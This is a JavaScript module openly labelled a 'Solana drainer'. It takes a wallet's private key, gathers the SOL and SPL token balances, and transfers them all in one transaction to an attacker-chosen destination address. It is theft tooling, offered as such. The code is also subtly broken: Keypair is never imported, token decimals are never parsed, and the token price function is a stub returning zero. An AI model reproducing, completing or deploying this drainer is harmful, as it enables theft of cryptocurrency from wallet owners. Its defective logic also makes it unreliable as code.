// ============================================================
// 🔴 SOLANA DRAINER MODULE
// Requires: npm install @solana/web3.js @solana/spl-token bs58
// ============================================================
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction } = require('@solana/spl-token');
const bs58 = require('bs58');

class SolanaDrainer {
  constructor(privateKeyBs58, rpcUrl = 'https://api.mainnet-beta.solana.com') {
    this.connection = new Connection(rpcUrl);
    this.wallet = this.loadWallet(privateKeyBs58);
    this.walletPublicKey = this.wallet.publicKey;
  }

  loadWallet(privateKeyBs58) {
    try {
      const privateKeyBytes = bs58.decode(privateKeyBs58);
      return Keypair.fromSecretKey(privateKeyBytes);
    } catch (error) {
      throw new Error('Invalid private key format. Must be BS58 encoded.');
    }
  }

  async getTokenBalances() {
    const balances = [];
    
    // Get native SOL balance
    const solBalance = await this.connection.getBalance(this.walletPublicKey);
    if (solBalance > 0) {
      balances.push({
        symbol: 'SOL',
        balance: solBalance / LAMPORTS_PER_SOL,
        mint: null,
        isNative: true
      });
    }

    // Get all token accounts
    const tokenAccounts = await this.connection.getTokenAccountsByOwner(
      this.walletPublicKey,
      { programId: TOKEN_PROGRAM_ID }
    );

    for (const { account, pubkey } of tokenAccounts.value) {
      const tokenData = await this.getTokenMetadata(account);
      if (tokenData && tokenData.balance > 0) {
        balances.push({
          symbol: tokenData.symbol,
          balance: tokenData.balance,
          mint: tokenData.mint,
          tokenAccount: pubkey
        });
      }
    }

    return balances;
  }

  async getTokenMetadata(account) {
    try {
      const data = Buffer.from(account.data);
      // Parse SPL token account data (simplified - use @solana/spl-token for full parsing)
      const mint = new PublicKey(data.slice(0, 32));
      const balance = Number(data.readBigUInt64LE(64));
      return { mint, balance };
    } catch {
      return null;
    }
  }

  async drainToDestination(destinationAddress, minValueUsd = 5) {
    const transaction = new Transaction();
    const balances = await this.getTokenBalances();
    let totalDrained = 0;

    // Transfer native SOL (leave ~0.01 SOL for fees)
    const solBalance = await this.connection.getBalance(this.walletPublicKey);
    if (solBalance > 0.01 * LAMPORTS_PER_SOL) {
      const transferAmount = solBalance - (0.01 * LAMPORTS_PER_SOL);
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: this.walletPublicKey,
          toPubkey: new PublicKey(destinationAddress),
          lamports: transferAmount
        })
      );
      totalDrained += transferAmount / LAMPORTS_PER_SOL * await this.getSolPrice();
    }

    // Transfer SPL tokens
    for (const token of balances) {
      if (token.isNative) continue;
      
      const price = await this.getTokenPrice(token.mint);
      const valueUsd = token.balance * price;
      
      if (valueUsd >= minValueUsd) {
        const destinationTokenAccount = await getAssociatedTokenAddress(
          token.mint,
          new PublicKey(destinationAddress)
        );

        transaction.add(
          createTransferInstruction(
            token.tokenAccount,
            destinationTokenAccount,
            this.walletPublicKey,
            token.balance * Math.pow(10, token.decimals)
          )
        );
        totalDrained += valueUsd;
      }
    }

    if (transaction.instructions.length > 0) {
      const signature = await this.connection.sendTransaction(transaction, [this.wallet]);
      await this.connection.confirmTransaction(signature);
      return { success: true, signature, totalValue: totalDrained };
    }

    return { success: false, message: 'No assets to drain' };
  }

  async getSolPrice() {
    // Use CoinGecko or similar API
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const data = await response.json();
    return data.solana.usd;
  }

  async getTokenPrice(mint) {
    // Implement price fetching for SPL tokens
    // Could use DexScreener, Jupiter, or CoinGecko APIs
    return 0; // Placeholder
  }
}

module.exports = { SolanaDrainer };
